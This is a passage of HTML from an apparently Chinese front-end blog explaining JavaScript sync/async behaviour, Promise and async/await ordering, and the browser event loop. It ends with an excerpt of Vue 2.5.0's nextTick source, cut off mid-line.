<li>尽量使用不触发回流的方式来实现样式</li>
<li>尽量修改dom树末端的dom样式</li>
<li>复杂的动画，让其脱离文档流</li>
</ul>
</li>
<li>js<ul>
<li>对于获取布局信息，尽量保存在变量中</li>
<li>一次性修改样式 display：none 脱离文档流 （现代浏览器已优化）className</li>
<li>使用 GPU 加速，transition：transform opacity</li>
</ul>
</li>
</ul>
</li>
</ul>

                                    

                                      <!-- copyright -->
                                      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF%E7%90%86%E8%AE%BA/" rel="tag">前端理论</a></li></ul>


    </footer>

  </div>

  

  

  

</article>
    
    <article id="post-同步与异步" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
      <header class="article-header">
         
<h2 itemprop="name">
  <a class="article-title" href="/2018/12/22/%E5%90%8C%E6%AD%A5%E4%B8%8E%E5%BC%82%E6%AD%A5/"
    >同步与异步</a
  >
</h2>
  

      </header>
      

        
          <div class="article-meta">
            <a href="/2018/12/22/%E5%90%8C%E6%AD%A5%E4%B8%8E%E5%BC%82%E6%AD%A5/" class="article-date">
  <time datetime="2018-12-21T16:15:28.000Z" itemprop="datePublished">2018-12-22</time>
</a>
              
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF%E7%90%86%E8%AE%BA/">前端理论</a>
  </div>

                
                  
                    
          </div>
          

            

                  <div class="article-entry" itemprop="articleBody">
                    


                      

                        
                                  <h1 id="同步-异步"><a href="#同步-异步" class="headerlink" title="同步 异步"></a>同步 异步</h1><ul>
<li>同步 <ul>
<li>如果在函数返回的时候，调用者就能够得到预期结果</li>
<li>如果函数是同步的，即使调用函数执行的任务比较耗时，也会一直等待直到得到预期结果。</li>
</ul>
</li>
<li>异步<ul>
<li>如果在函数返回的时候，调用者还不能够得到预期结果，而是需要在将来通过一定的手段得到，那么这个函数就是异步的。</li>
<li>如果函数是异步的，发出调用之后，马上返回，但是不会马上返回预期结果。调用者不必主动等待，当被调用者得到结果之后会通过回调函数主动通知调用者。</li>
</ul>
</li>
</ul>
<h1 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h1><ul>
<li>new Promise直接执行，返回Promise对象<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// 这一段是 同步执行函数（resolve()和reject()是异步的）</span></span><br><span class="line">    <span class="keyword">if</span>(successed)</span><br><span class="line">    &#123;</span><br><span class="line">        resolve(value); <span class="comment">//成功返回结果</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        reject(error);  <span class="comment">//失败返回错误信息</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">promise.then(<span class="function">(<span class="params">value</span>)=&gt;</span>&#123; <span class="comment">// resolve回调函数</span></span><br><span class="line">    consoe.log(then)</span><br><span class="line">&#125;,</span><br><span class="line">(error)=&gt;&#123;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
例如<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'script start'</span>)     <span class="comment">//1.(tick1)主代码-宏任务</span></span><br><span class="line"><span class="keyword">let</span> promise1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'promise1'</span>)     <span class="comment">//2.(tick1)主代码-同步执行函数</span></span><br><span class="line">    resolve()</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'promise1 end'</span>) <span class="comment">//3.(tick1)主代码-同步执行函数</span></span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'promise then'</span>)     <span class="comment">//5.(tick1)promise回调-微任务</span></span><br><span class="line">&#125;)</span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;          <span class="comment">//6.(tick2)-宏任务</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'settimeout'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'script end'</span>)       <span class="comment">//4.(tick1)主代码-宏任务</span></span><br></pre></td></tr></table></figure>
<h1 id="async-await"><a href="#async-await" class="headerlink" title="async await"></a>async await</h1>async 函数返回一个 Promise 对象，当函数执行的时候，一旦遇到 await 就会先返回，等到触发的异步操作完成，再执行函数体内后面的语句。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">async1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'async1 start'</span>) <span class="comment">//2.(tick1)主代码-async1</span></span><br><span class="line">    <span class="keyword">await</span> async2()</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'async1 end'</span>)   <span class="comment">//7.(tick1)promise回调 -微任务</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">async2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'async2'</span>)       <span class="comment">//3.(tick1)主代码-async2 返回Promise对象</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'script start'</span>)     <span class="comment">//1.(tick1)主代码-宏任务</span></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'settimeout'</span>)   <span class="comment">//9.(tick2)setTimeout -第二轮宏任务</span></span><br><span class="line">&#125;)</span><br><span class="line">async1()</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'promise1'</span>)     <span class="comment">// 4.(tick1)主代码</span></span><br><span class="line">    resolve()</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'promise1 end'</span>) <span class="comment">// 5.(tick1)主代码</span></span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'promise then'</span>) <span class="comment">// 8.(tick1)promise回调 -微任务</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'script end'</span>)       <span class="comment">// 6.(tick1)主代码</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">async1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="string">'async1 start'</span>);</span><br><span class="line">    <span class="keyword">await</span> async2();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'async1 end'</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">async2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'async2'</span>)</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'promise1'</span>)     </span><br><span class="line">        resolve()</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'promise1 end'</span>) </span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'promise then'</span>) </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">async1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'async1 start'</span>);</span><br><span class="line">	<span class="keyword">await</span> async2();</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'async1 end'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>等价于</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">async1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'async1 start'</span>);</span><br><span class="line">	<span class="built_in">Promise</span>.resolve(async2()).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'async1 end'</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">async1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'async1 start'</span>);    <span class="comment">//2</span></span><br><span class="line">    <span class="keyword">await</span> async2();</span><br><span class="line">    <span class="comment">//更改如下：</span></span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;        <span class="comment">// 第三轮 9</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'setTimeout1'</span>)</span><br><span class="line">    &#125;,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">async2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//更改如下：</span></span><br><span class="line">	setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;         <span class="comment">// 第二轮 7</span></span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">'setTimeout2'</span>)</span><br><span class="line">	&#125;,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'script start'</span>);        <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;             <span class="comment">// 第二轮 6</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'setTimeout3'</span>);</span><br><span class="line">&#125;, <span class="number">0</span>)</span><br><span class="line">async1();                           </span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'promise1'</span>);        <span class="comment">// 3</span></span><br><span class="line">    resolve();</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'promise2'</span>);        <span class="comment">// 5 第一轮微任务</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'script end'</span>);          <span class="comment">// 4</span></span><br></pre></td></tr></table></figure>


                                    

                                      <!-- copyright -->
                                      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF%E7%90%86%E8%AE%BA/" rel="tag">前端理论</a></li></ul>


    </footer>

  </div>

  

  

  

</article>
    
    <article id="post-事件循环" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
      <header class="article-header">
         
<h2 itemprop="name">
  <a class="article-title" href="/2018/12/22/%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/"
    >事件循环</a
  >
</h2>
  

      </header>
      

        
          <div class="article-meta">
            <a href="/2018/12/22/%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/" class="article-date">
  <time datetime="2018-12-21T16:15:28.000Z" itemprop="datePublished">2018-12-22</time>
</a>
              
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF%E7%90%86%E8%AE%BA/">前端理论</a>
  </div>

                
                  
                    
          </div>
          

            

                  <div class="article-entry" itemprop="articleBody">
                    


                      

                        
                                  <h1 id="JS-运行机制"><a href="#JS-运行机制" class="headerlink" title="JS 运行机制"></a>JS 运行机制</h1><p>JS 执行是单线程的， 它是基于事件循环的。 事件循环大致分为以下几个步骤：</p>
<ol>
<li><p>所有同步任务都在主线程上执行， 形成一个执行栈（ execution context stack）。</p>
</li>
<li><p>主线程之外， 还存在一个 “任务队列”（task queue）。 只要异步任务有了运行结果， 就在 “任务队列”之中放置一个事件。</p>
</li>
<li><p>一旦 “执行栈”<br>中的所有同步任务执行完毕， 系统就会读取 “任务队列”，<br>看看里面有哪些事件。 那些对应的异步任务， 于是结束等待状态， 进入执行栈， 开始执行。</p>
</li>
<li><p>主线程不断重复上面的第三步。</p>
</li>
</ol>
<p><img src="http://103.14.34.148:9000/imgs/blog/img/event-loop.png" alt="事件循环"></p>
<p>  主线程的执行过程就是一个 tick， 而所有的异步结果都是通过“ 任务队列” 来调度。 消息队列中存放的是一个个的任务（ task）。 规范中规定 task 分为两大类， 分别是 macro task 和 micro task， 并且每个 macro task 结束后， 都要清空所有的 micro task。</p>
<p>关于 macro task 和 micro task 的概念， 这里不会细讲， 简单通过一段代码演示他们的执行顺序：</p>
<p>  ``<br>`js<br>for (macroTask of macroTaskQueue) {<br>    // 1. Handle current MACRO-TASK<br>    handleMacroTask();</p>
<pre><code>// 2. Handle all MICRO-TASK
for (microTask of microTaskQueue) {
    handleMicroTask(microTask);
}</code></pre><p>}<br>`<br>``<br>在浏览器环境中，<br>常见的 macro task 有 setTimeout、setImmediate MessageChannel、 postMessage；<br>常见的 micro task 有 MutationObsever 和 Promise.then。</p>
<h3 id="浏览器下事件循环-Event-Loop"><a href="#浏览器下事件循环-Event-Loop" class="headerlink" title="浏览器下事件循环(Event Loop)"></a>浏览器下事件循环(Event Loop)</h3><p>主线程只会做一件事情，就是从消息队列里面取消息、执行消息，再取消息、再执行。当消息队列为空时，就会等待直到消息队列变成非空。而且主线程只有在将当前的消息执行完成后，才会去取下一个消息。这种机制就叫做事件循环机制，取一个消息并执行的过程叫做一次循环</p>
<h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><ul>
<li>在此次 tick 中选择最先进入宏任务队列的任务(oldest task)，如果有则执行(一次)</li>
<li>检查是否存在 Microtasks，如果存在则不停地执行，直至清空 Microtasks Queue （在执行微任务的时候，如果又有微任务进入队列，则在此次循环中执行）</li>
<li>更新 render （视图更新）</li>
<li>主线程重复执行上述步骤<br>上述为一轮事件循环</li>
</ul>
<p><img src="http://103.14.34.148:9000/imgs/blog/img/browser-deom1-excute-animate.gif" alt=""></p>
<h4 id="宏任务-微任务"><a href="#宏任务-微任务" class="headerlink" title="宏任务 微任务"></a>宏任务 微任务</h4><ul>
<li>微任务 microtask(jobs): promise / ajax / Object.observe(该方法已废弃)</li>
<li>宏任务 macrotask(task): setTimout / <strong>script（整体代码）</strong> / IO（有太多的东西都可以称之为I/O，点击一次button，上传一个文件，与程序产生交互的这些都可以称之为I/O） / UI Rendering（页面渲染）<ul>
<li>宏任务优先级 优先执行冒泡的事件</li>
</ul>
</li>
</ul>
<blockquote>
<p>程序的script代码也算宏任务，所以第一次事件循环首先执行的是script代码，再去清空微任务队列</p>
</blockquote>
<p>特点</p>
<ul>
<li>一个线程中，事件循环是唯一的，但是任务队列可以拥有多个</li>
<li>setTimeout/Promise等我们称之为任务源。而进入任务队列的是他们指定的具体执行任务。</li>
<li>来自不同任务源的任务会进入到不同的任务队列。其中setTimeout与setInterval是同源的。</li>
</ul>
<p>总结</p>
<ul>
<li>事件循环是js实现异步的核心</li>
<li>每轮事件循环分为3个步骤：<br>  (a) 执行macrotask队列的一个任务<br>  (b) 执行完当前microtask队列的所有任务<br>  (c) UI render</li>
</ul>
<p>浏览器只保证requestAnimationFrame的回调在重绘之前执行，没有确定的时间，何时重绘由浏览器决定</p>
<p><a href="http://lynnelv.github.io/js-event-loop-browser" target="_blank" rel="noopener">参考来源</a></p>
<h1 id="Vue-2-5-0的实现（nextTick）"><a href="#Vue-2-5-0的实现（nextTick）" class="headerlink" title="Vue 2.5.0的实现（nextTick）"></a>Vue 2.5.0的实现（nextTick）</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; noop &#125; <span class="keyword">from</span> <span class="string">'shared/util'</span></span><br><span class="line"><span class="keyword">import</span> &#123; handleError &#125; <span class="keyword">from</span> <span class="string">'./error'</span></span><br><span class="line"><span class="keyword">import</span> &#123; isIOS, isNative &#125; <span class="keyword">from</span> <span class="string">'./env'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> callbacks = []</span><br><span class="line"><span class="keyword">let</span> pending = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flushCallbacks</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  pending = <span class="literal">false</span></span><br><span class="line">  <span class="keyword">const</span> copies = callbacks.slice(<span class="number">0</span>)</span><br><span class="line">  callbacks.length = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; copies.length; i++) &#123;</span><br><span class="line">    copies[i]()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Here we have async deferring wrappers using both microtasks and (macro) tasks.</span></span><br><span class="line"><span class="comment">// In &lt; 2.4 we used microtasks everywhere, but there are some scenarios where</span></span><br><span class="line"><span class="comment">// microtasks have too high a priority and fire in between supposedly</span></span><br><span class="line"><span class="comment">// sequential events (e.g. #4521, #6690) or even between bubbling of the same</span></span><br><span class="line"><span class="comment">// event (#6566). However, using (macro) tasks everywhere also has subtle problems</span></span><br><span class="line"><span class="comment">// when state is changed right before repaint (e.g. #6813, out-in transitions).</span></span><br><span class="line"><span class="comment">// Here we use microtask by default, but expose a way to force (macro) task when</span></span><br><span class="line"><span class="comment">// needed (e.g. in event handlers attached by v-on).</span></span><br><span class="line"><span class="keyword">let</span> microTimerFunc</span><br><span class="line"><span class="keyword">let</span> macroTimerFunc</span><br><span class="line"><span class="keyword">let</span> useMacroTask = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Determine (macro) task defer implementation.</span></span><br><span class="line"><span class="comment">// Technically setImmediate should be the ideal choice, but it's only available</span></span><br><span class="line"><span class="comment">// in IE. The only polyfill that consistently queues the callback after all DOM</span></span><br><span class="line"><span class="comment">// events triggered in the same loop is by using MessageChannel.</span></span><br><span class="line"><span class="comment">/* istanbul ignore if */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> setImmediate !== <span class="string">'undefined'</span> &amp;&amp; isNative(setImmediate)) &#123;</span><br><span class="line">  macroTimerFunc = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    setImmediate(flushCallbacks)</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> MessageChannel !== <span class="string">'undefined'</span> &amp;&amp; (</span><br><span class="line">  isNative(MessageChannel) ||</span><br><span class="line">  <span class="comment">// PhantomJS</span></span><br><span class="line">  MessageChannel.toString() === <span class="string">'[object MessageChannelConstructor]'</span></span><br><span class="line">)) &#123;</span><br><span class="line">  <span class="keyword">const</span> channel = <span class="keyword">new</span> MessageChannel()</span><br><span class="line">  <span class="keyword">const</span> port = channel.port2</span><br><span class="line">  channel.port1.onmessage = flushCallbacks</span><br><span class="line">  macroTimerFunc = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    port.postMessage(<span class="number">1</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">/* istanbul ignore next */</span></span><br><span class="line">  macroTimerFunc = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    setTimeout(flushCallbacks, <span class="number">0</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Determine microtask defer implementation.</span></span><br><span class="line"><span class="comment">/* istanbul ignore next, $flow-disable-line */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">Promise</span> !== <span class="string">'undefined'</span> &amp;&amp; isNative(<span class="built_in">Promise</span>)) &#123;</span><br><span class="line">  <span class="keyword">const</span> p = <span class="built_in">Promise</span>.resolve()</span><br><span class="line">  microTimerFunc = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    p.then(flushCallbacks)</span><br><span class="line">    <span class="comment">// in problematic UIWebViews, Promise.then doesn't completely break, but</span></span><br><span class="line">    <span class="comment">// it can get stuck in a weird state where callbacks are pushed into the</span></span><br><span class="line">    <span class="comment">// microtask queue but the queue isn't being flushed, until the browser</span></span><br><span class="line">    <span class="comment">// needs to do some other work, e.g. handle a timer. Therefore we can</span></span><br><span class="line">    <span class="comment">// "force" the microtask queue to be flushed by adding an empty timer.</span></span><br><span class="line">    <span class="keyword">if</span> (isIOS) setTimeout(noop)</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// fallback to macro</span></span><br><span class="line">  microTimerFunc = macroTimerFunc</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Wrap a function so that if any code inside triggers state change,</span></span><br><span class="line"><span class="comment"> * the changes are queued using a (macro) task instead of a microtask.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">withMacroTask</span> (<span class="params">fn: Function</span>): <span class="title">Function</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> fn._withTask || (fn._withTask = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    useMacroTask = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">const</span> res = fn.apply(<span class="literal">null</span>, <span class="built_in">arguments</span>)</span><br><span class="line">    useMacroTask = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">nextTick</span> (<span class="params">cb?: Function, ctx?: Object</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> _resolve</span><br><span class="line">  callbacks.push(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cb) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        cb.call(ctx)</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        handleError(e, ctx, <span class="string">'nextTick'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (_resolve) &#123;</span><br><span class="line">      _resolve(ctx)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">if</span> (!pending) &#123;</span><br><span class="line">    pending = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">if</span> (useMacroTask) &#123;</span><br><span class="line">      macroTimerFunc()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      microTimerFunc()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// $flow-disable-line</span></span><br><span class="line">  <span class="keyword">if</span> (!cb &amp;&amp; <span class="keyword">typeof</span> <span class="built_in">Promise</span> !== <span class="string">'undefined'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">      _resolve = resolve</span><br><span 